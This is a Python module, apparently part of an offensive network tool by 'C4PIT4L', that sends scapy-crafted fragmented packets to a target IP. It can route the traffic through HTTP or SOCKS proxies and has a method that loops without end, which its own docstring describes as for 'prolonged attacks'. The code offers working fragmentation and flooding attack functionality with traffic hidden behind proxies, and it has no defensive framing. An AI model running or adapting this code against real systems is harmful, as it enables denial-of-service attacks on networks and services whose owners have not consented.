#---------------------------------------------------------------------------------#
# PacketSender sends fragmented packets created by the PacketCrafter to the target.
# - Created By: C4PIT4L
#---------------------------------------------------------------------------------#

import requests
import socks
import socket
from scapy.sendrecv import send
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class PacketSender:
    def __init__(self, fragments, target_ip, proxy=None):
        self.fragments = fragments
        self.target_ip = target_ip
        self.proxy = proxy

        print(f"PacketSender initialized for sending fragments to {self.target_ip}.")

        if self.proxy:
            self.setup_proxy()

    def setup_proxy(self):
        """Configure proxy settings for packet sending."""
        parsed_proxy = self.proxy.split('://')
        protocol = parsed_proxy[0]
        proxy_address = parsed_proxy[1]

        if protocol in ['http', 'https']:
            proxies = {protocol: f'{self.proxy}'}
            self.session = requests.Session()
            retries = Retry(total=5, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
            self.session.mount('http://', HTTPAdapter(max_retries=retries))
            self.session.mount('https://', HTTPAdapter(max_retries=retries))
            self.session.proxies.update(proxies)

            print(f"HTTP/HTTPS Proxy set to: {self.proxy}")

        elif protocol in ['socks4', 'socks5']:
            socks_protocol = socks.SOCKS5 if protocol == 'socks5' else socks.SOCKS4
            proxy_host, proxy_port = proxy_address.split(':')
            socks.set_default_proxy(socks_protocol, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket
            print(f"SOCKS Proxy set to: {self.proxy}")
        else:
            print("Unsupported proxy protocol. Only HTTP, HTTPS, SOCKS4, and SOCKS5 are supported.")
            raise ValueError("Unsupported proxy protocol. Please use HTTP, HTTPS, SOCKS4, or SOCKS5.")

    def send_fragments(self):
        """Send the fragmented packets to the target."""
        for i, fragment in enumerate(self.fragments):
            try:
                send(fragment, verbose=0)
                print(f"Sent fragment {i + 1} to {self.target_ip}.")
            except Exception as e:
                print(f"Error sending fragment {i + 1}: {e}")
                continue

    def send_fragments_indefinitely(self):
        """Send fragments indefinitely for prolonged attacks."""
        try:
            while True:
                for i, fragment in enumerate(self.fragments):
                    send(fragment, verbose=0)
                    print(f"Sent fragment {i + 1} to {self.target_ip} (Indefinitely).")
        except KeyboardInterrupt:
            print("Attack interrupted by user. Stopping packet transmission.")
        except Exception as e:
            print(f"Error sending packets indefinitely: {e}")
